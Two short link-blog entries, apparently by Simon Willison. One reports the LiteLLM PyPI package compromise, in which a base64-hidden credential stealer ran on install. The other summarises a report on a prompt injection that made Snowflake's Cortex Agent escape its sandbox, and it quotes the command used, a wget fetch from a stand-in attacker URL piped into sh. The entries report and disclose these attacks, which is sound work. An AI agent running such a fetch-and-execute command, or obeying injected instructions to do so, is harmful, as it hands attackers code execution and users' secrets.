Mar 21 Simon Willison

LiteLLM Supply Chain Attack

The LiteLLM v1.82.8 package on PyPI was compromised with a credential stealer hidden in base64 in a litellm_init.pth file, triggered just by installing the package. It stole secrets from ~/.ssh/, ~/.aws/, ~/.kube/, and many other locations.

Mar 24 Simon Willison

Snowflake Cortex Sandbox Escape

PromptArmor report on a prompt injection attack in Snowflake's Cortex Agent (now fixed). The attack executed malicious code via process substitution: `cat < <(sh < <(wget -q0- https://ATTACKER_URL.com/bugbot))`.
